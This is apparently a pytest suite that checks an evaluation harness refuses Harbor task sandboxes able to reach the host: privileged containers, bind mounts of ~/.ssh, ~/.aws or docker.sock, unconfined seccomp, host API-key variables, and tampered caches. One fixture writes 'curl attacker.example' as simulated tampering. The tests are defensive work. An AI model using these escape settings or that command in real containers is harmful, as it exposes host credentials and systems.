import json
import re
import sys
from pathlib import Path

import pytest

from whitney.harbor_cache import file_digests
from whitney.harbor_tasks import bigcodebench_hard_complete

MODEL = "test-provider/test-model"  # no default model; any provider/model will do here


def test_unknown_variant_is_rejected():
    with pytest.raises(ValueError, match="variant must be 'baseline' or 'template'"):
        bigcodebench_hard_complete(target="kilo", model=MODEL, variant="allow_control")


def test_missing_local_dataset_is_named(tmp_path):
    missing = tmp_path / "nowhere"
    with pytest.raises(FileNotFoundError, match=f"Local Harbor dataset directory not found: {missing}"):
        bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(missing))


def test_missing_harbor_extra_says_how_to_install_it(tmp_path, monkeypatch):
    for name in ("inspect_harbor", "inspect_harbor._harbor", "inspect_harbor._harbor.converters"):
        monkeypatch.setitem(sys.modules, name, None)  # import fails whether or not the extra is installed
    with pytest.raises(RuntimeError, match=r'pip install -e "\.\[harbor\]"'):
        bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path))


# The tests below load real Harbor tasks from folders they write, through the real
# inspect-harbor package, so the checks see the sandbox config Harbor actually produces.

DOCKERFILE_TASK = None  # the task builds environment/Dockerfile, as BigCodeBench's do


def write_task(dataset: Path, compose: str | None = DOCKERFILE_TASK, toml: str = "", name: str = "sample") -> Path:
    """A Harbor task folder in `dataset`, with a docker-compose.yaml if `compose` is given."""
    task = dataset / f"{name}-task"
    (task / "environment").mkdir(parents=True)
    (task / "tests").mkdir()
    (task / "task.toml").write_text(f'[task]\nname = "bigcode/{name}"\n\n[environment]\nnetwork_mode = "no-network"\n{toml}')
    (task / "instruction.md").write_text("Write a solution. Save to /workspace/solution.py\n")
    (task / "tests" / "test.sh").write_text("#!/bin/sh\nexit 0\n")
    if compose is DOCKERFILE_TASK:
        (task / "environment" / "Dockerfile").write_text("FROM python:3.12-slim\n")
    else:
        (task / "environment" / "docker-compose.yaml").write_text(compose, encoding="utf-8")
    return task


def compose_task(dataset: Path, service: str, top_level: str = "") -> Path:
    """A task whose docker-compose.yaml has one service, `main`, with these extra settings."""
    settings = "".join(f"    {line}\n" for line in service.strip().splitlines())
    return write_task(dataset, f"services:\n  main:\n    image: python:3.12-slim\n    command: tail -f /dev/null\n{settings}{top_level}")


def load(dataset: Path, **kwargs):
    return bigcodebench_hard_complete(target=kwargs.pop("target", "kilo"), model=kwargs.pop("model", MODEL), dataset_path=str(dataset), **kwargs)


def sync(dataset: Path) -> None:
    """Write the manifest the cache script writes, with a digest of every file."""
    (dataset / "inspect-harbor-manifest.json").write_text(json.dumps({"files": file_digests(dataset)}, ensure_ascii=False), encoding="utf-8")


def test_harbor_task_uses_kilo_local_artifact_and_networkless_sandbox(tmp_path):
    task_dir = write_task(tmp_path)
    template_task = load(tmp_path, variant="template")
    baseline_task = load(tmp_path, variant="baseline")
    [sample] = list(template_task.dataset)

    assert sample.id == "bigcode/sample"
    assert "solution.py" in sample.input
    assert "/workspace/solution.py" in sample.input
    assert sample.sandbox.config.services["default"].network_mode == "none"
    assert sample.sandbox.config.services["default"].build.context == str(task_dir / "environment")
    assert "AGENTS.md" in template_task.metadata["evaluation_assets"]
    assert "AGENTS.md" not in baseline_task.metadata["evaluation_assets"]


def test_harbor_task_has_no_default_model(tmp_path):
    with pytest.raises(TypeError, match="'model'"):
        bigcodebench_hard_complete(dataset_path=str(tmp_path))


def test_claude_code_target_writes_the_solution_without_a_shell(tmp_path):
    write_task(tmp_path)
    task = load(tmp_path, target="claude-code", model="anthropic/claude-haiku-4-5")

    assert set(task.metadata["evaluation_assets"]) == {"AGENTS.md"}
    assert task.metadata["harness_permissions"] == {"allow": ["Read", "Edit", "Write"], "deny": ["Bash"]}


def test_the_cache_is_checked_against_its_manifest_before_use(tmp_path):
    task_dir = write_task(tmp_path)
    sync(tmp_path)

    task = load(tmp_path)
    assert task.metadata["cache_integrity"] == "verified"

    (task_dir / "task.toml").write_text("[task]\nchanged = true\n")
    with pytest.raises(ValueError, match="changed since it was synced: sample-task/task.toml"):
        load(tmp_path)


def test_a_cache_without_a_manifest_is_used_but_recorded_as_unverified(tmp_path):
    write_task(tmp_path)
    task = load(tmp_path)
    assert task.metadata["cache_integrity"] == "unverified: no manifest"


def test_a_symlink_in_the_cache_is_refused(tmp_path):
    task_dir = write_task(tmp_path)
    (task_dir / "environment" / "Dockerfile").unlink()
    (task_dir / "environment" / "Dockerfile").symlink_to("/etc/hosts")
    with pytest.raises(ValueError, match="Dockerfile is a symlink"):
        load(tmp_path)


@pytest.mark.parametrize(
    "service, named",
    [
        ("privileged: true", "privileged"),
        ("cap_add: [SYS_ADMIN]", "cap_add"),
        ("devices: [/dev/kvm]", "devices"),
        ("volumes: ['/Users/someone/.ssh:/root/.ssh']", "bind mount /Users/someone/.ssh"),
        ("volumes: ['./data:/data']", "bind mount ./data"),
        ("volumes: ['~/.aws:/home/node/.aws:ro']", "bind mount ~/.aws"),
        (
            "volumes:\n  - {type: bind, source: /var/run/docker.sock, target: /var/run/docker.sock}",
            "bind mount /var/run/docker.sock",
        ),
        ("env_file: [/Users/someone/project/.env]", "env_file /Users/someone/project/.env"),
        ("env_file: /Users/someone/project/.env", "env_file /Users/someone/project/.env"),
        ("security_opt: ['seccomp:unconfined']", "security_opt seccomp:unconfined"),
        ("cgroup: host", "cgroup host"),
        ("build: {context: /Users/someone}", "build context /Users/someone, outside the task folder"),
        ("build: /", "build context /, outside the task folder"),
        ("build: {context: ../..}", "build context ../.., which resolves against the folder the eval runs in"),
    ],
)
def test_a_task_whose_sandbox_reaches_the_host_is_refused(tmp_path, service, named):
    compose_task(tmp_path, service)
    with pytest.raises(ValueError, match=f"asks for {re.escape(named)}, which would let"):
        load(tmp_path)


@pytest.mark.parametrize(
    "top_level, named",
    [
        ("volumes:\n  data:\n    driver_opts: {type: none, o: bind, device: /etc}\n", "volume data with driver_opts"),
        ("volumes:\n  data:\n    external: true\n", "volume data with external"),
        ("volumes:\n  data:\n    driver: local\n", "volume data with driver"),
    ],
)
def test_a_top_level_volume_that_can_reach_the_host_is_refused(tmp_path, top_level, named):
    compose_task(tmp_path, "volumes: ['data:/data']", top_level)
    with pytest.raises(ValueError, match=f"asks for {re.escape(named)}, which would let"):
        load(tmp_path)


def test_every_way_a_task_reaches_the_host_is_named(tmp_path):
    service = "privileged: true\nbuild: {context: /}\nvolumes: ['a:/a', 'b:/b']"
    compose_task(tmp_path, service, "volumes:\n  a: {external: true}\n  b: {driver: local}\n")
    with pytest.raises(ValueError) as raised:
        load(tmp_path)
    assert str(raised.value) == (
        "Harbor task 'bigcode/sample' asks for volume a with external, volume b with driver, privileged, "
        "build context /, outside the task folder, which would let its container reach the host; refusing to run it."
    )


def test_named_and_anonymous_volumes_are_allowed(tmp_path):
    compose_task(tmp_path, "volumes: ['cache:/cache', /scratch]\nsecurity_opt: ['no-new-privileges:true']", "volumes:\n  cache: {}\n")
    [sample] = list(load(tmp_path).dataset)
    assert sample.sandbox.config.services["main"].volumes == ["cache:/cache", "/scratch"]


def test_a_build_context_inside_the_task_folder_is_allowed(tmp_path):
    task_dir = compose_task(tmp_path, "build: {context: '${CONTEXT_DIR}'}")
    (task_dir / "environment" / "Dockerfile").write_text("FROM python:3.12-slim\n")
    [sample] = list(load(tmp_path).dataset)
    assert sample.sandbox.config.services["main"].build.context == str(task_dir / "environment")


@pytest.mark.parametrize(
    "service, toml, variable",
    [
        ("environment: {KEY: '${WHITNEY_TEST_HOST_VAR}'}", "", "WHITNEY_TEST_HOST_VAR"),
        ("environment: {KEY: '${WHITNEY_TEST_HOST_VAR:-unset}'}", "", "WHITNEY_TEST_HOST_VAR"),
        ("environment: {KEY: 'x-$WHITNEY_TEST_HOST_VAR'}", "", "WHITNEY_TEST_HOST_VAR"),
        ("environment: {KEY: '$CONTEXT_DIR'}", "", "CONTEXT_DIR"),  # Harbor fills only ${...}; Compose fills $NAME
        ("", '\n[environment.env]\nKEY = "${WHITNEY_TEST_HOST_VAR}"\n', "WHITNEY_TEST_HOST_VAR"),
        ("", '\n[environment.env]\nKEY = "prefix-${WHITNEY_TEST_HOST_VAR}"\n', "WHITNEY_TEST_HOST_VAR"),
        ("", '\n[verifier.env]\nKEY = "${WHITNEY_TEST_HOST_VAR}"\n', "WHITNEY_TEST_HOST_VAR"),
        ("", '\n[verifier.env]\nKEY = "${WHITNEY_TEST_HOST_VAR:-unset}"\n', "WHITNEY_TEST_HOST_VAR"),
        ("", '\n[environment.healthcheck]\ncommand = "test -n $WHITNEY_TEST_HOST_VAR"\n', "WHITNEY_TEST_HOST_VAR"),
    ],
)
def test_a_task_that_reads_the_hosts_environment_is_refused(tmp_path, monkeypatch, service, toml, variable):
    # Harbor fills ${VAR} from the host, and Compose fills whatever is left, so a task could
    # copy the host's API keys into a container the agent and verifier can read.
    monkeypatch.setenv("WHITNEY_TEST_HOST_VAR", "not-a-real-secret")
    write_task(tmp_path, f"services:\n  main:\n    image: python:3.12-slim\n    {service or 'init: true'}\n", toml)
    with pytest.raises(ValueError, match=f"^Harbor task 'bigcode/sample' reads {variable} from the host's environment, "):
        load(tmp_path)


@pytest.mark.parametrize(
    "toml",
    [
        '\n[verifier.env]\nKEY = "$WHITNEY_TEST_HOST_VAR"\n',
        '\n[verifier.env]\nKEY = "prefix-${WHITNEY_TEST_HOST_VAR}"\n',
        '\n[solution.env]\nKEY = "${WHITNEY_TEST_HOST_VAR}"\n',
    ],
)
def test_env_values_that_never_reach_the_host_are_allowed(tmp_path, monkeypatch, toml):
    # The verifier fills only whole ${VAR} templates and passes the rest on as text;
    # [solution].env is read only by inspect-harbor's oracle, which Whitney doesn't run.
    monkeypatch.setenv("WHITNEY_TEST_HOST_VAR", "not-a-real-secret")
    write_task(tmp_path, toml=toml)
    assert len(load(tmp_path).dataset) == 1


def test_a_compose_file_is_read_as_utf8_whatever_the_locale(tmp_path, ascii_locale):
    compose = "# données de test\nservices:\n  main:\n    image: python:3.12-slim\n    environment: {KEY: '$NAMED'}\n"
    write_task(tmp_path, compose)
    with pytest.raises(ValueError, match="reads NAMED from the host's environment"):
        load(tmp_path)


def test_every_host_variable_a_task_reads_is_named_once(tmp_path):
    compose = "services:\n  main:\n    image: python:3.12-slim\n    environment: {A: '${ZED}', B: '$ALPHA', C: '${ZED}'}\n"
    write_task(tmp_path, compose, '\n[verifier.env]\nKEY = "${MIDDLE}"\n')
    with pytest.raises(ValueError) as raised:
        load(tmp_path)
    assert str(raised.value) == (
        "Harbor task 'bigcode/sample' reads ALPHA, MIDDLE, ZED from the host's environment, which would copy "
        "host values such as API keys into its container; refusing to run it."
    )


def test_harbors_own_variables_escaped_dollars_and_the_tasks_own_env_are_allowed(tmp_path):
    compose = (
        "services:\n  main:\n    image: '${MAIN_IMAGE_NAME}'\n"
        "    environment: {TESTS: '${TEST_DIR}', PRICE: '$$5', OWN: '${FROM_TABLE}'}\n"
    )
    task_dir = write_task(tmp_path, compose, '\n[environment.env]\nFROM_TABLE = "plain value"\n\n[verifier.env]\nMODE = "strict"\n')
    (task_dir / "environment" / "Dockerfile").write_text("FROM python:3.12-slim\n")
    [sample] = list(load(tmp_path).dataset)
    assert sample.sandbox.config.services["main"].environment["OWN"] == "plain value"


def test_files_added_or_removed_since_the_sync_are_refused(tmp_path):
    write_task(tmp_path)
    (tmp_path / "tests.sh").write_text("exit 0\n")
    sync(tmp_path)
    (tmp_path / "tests.sh").unlink()
    with pytest.raises(ValueError, match="changed since it was synced: tests.sh$"):  # removed
        load(tmp_path)

    sync(tmp_path)
    for n in range(7):
        (tmp_path / f"extra{n}.sh").write_text("curl attacker.example\n")
    with pytest.raises(ValueError, match="changed since it was synced: extra0.sh, .*extra4.sh and 2 more$"):  # added
        load(tmp_path)


def test_a_manifest_from_before_digests_is_used_but_recorded_as_unverified(tmp_path):
    write_task(tmp_path)
    (tmp_path / "inspect-harbor-manifest.json").write_text('{"package": "bigcode/bigcodebench-hard-complete"}')
    task = load(tmp_path)
    assert task.metadata["cache_integrity"] == "unverified: the manifest has no file digests; re-sync the cache to add them"


def test_the_summary_of_changed_files_lists_five_then_counts_the_rest(tmp_path):
    for count, more in ((5, ""), (6, " and 1 more")):
        (tmp_path / "inspect-harbor-manifest.json").write_text(json.dumps({"files": {}}))
        for n in range(count):
            (tmp_path / f"added{n}.sh").write_text("x\n")
        with pytest.raises(ValueError) as raised:
            load(tmp_path)
        assert str(raised.value).endswith(f"added4.sh{more}")


def test_a_manifest_is_read_as_utf8_whatever_the_locale(tmp_path, ascii_locale):
    write_task(tmp_path)
    (tmp_path / "données.txt").write_text("x\n")
    sync(tmp_path)
    assert "données.txt" in (tmp_path / "inspect-harbor-manifest.json").read_text(encoding="utf-8")

    task = load(tmp_path)

    assert task.metadata["cache_integrity"] == "verified"


def test_a_claude_code_project_path_stages_its_claude_md_and_names_what_it_left_out(tmp_path):
    dataset = tmp_path / "dataset"
    write_task(dataset)
    project = tmp_path / "project"
    (project / ".claude").mkdir(parents=True)
    (project / "CLAUDE.md").write_text("- Team rule\n")
    (project / ".claude/settings.json").write_text("{}")

    task = load(dataset, target="claude-code", model="anthropic/claude-haiku-4-5", project_path=str(project))

    assert task.metadata["evaluation_assets"] == {"AGENTS.md": "- Team rule\n"}
    assert task.metadata["renamed"] == {"CLAUDE.md": "AGENTS.md"}
    assert task.metadata["not_staged"] == [".claude/settings.json"]
    assert task.metadata["asset_source"] == "local project"
    assert load(dataset).metadata["not_staged"] == []


def test_a_claude_code_baseline_names_no_rename(tmp_path):
    dataset = tmp_path / "dataset"
    write_task(dataset)
    project = tmp_path / "project"
    project.mkdir()
    (project / "CLAUDE.md").write_text("- Team rule\n")
    task = load(dataset, target="claude-code", model="anthropic/claude-haiku-4-5", project_path=str(project), variant="baseline")
    assert task.metadata["renamed"] == {}
    assert task.metadata["not_staged_reasons"] == {}


def test_a_project_path_never_stages_the_evals_path(tmp_path, monkeypatch):
    from whitney import shipped_evals

    dataset = tmp_path / "dataset"
    write_task(dataset)
    project = tmp_path / "project"
    (project / "evals").mkdir(parents=True)
    (project / "kilo.jsonc").write_text('{"instructions": ["**/*.md"]}')
    (project / "AGENTS.md").write_text("- Team rule\n")
    (project / "evals" / "notes.md").write_text("the evals and their tokens\n")
    monkeypatch.setattr(shipped_evals, "EVALS_DIR", project / "evals")

    task = load(dataset, project_path=str(project))

    assert set(task.metadata["evaluation_assets"]) == {"kilo.jsonc", "AGENTS.md"}
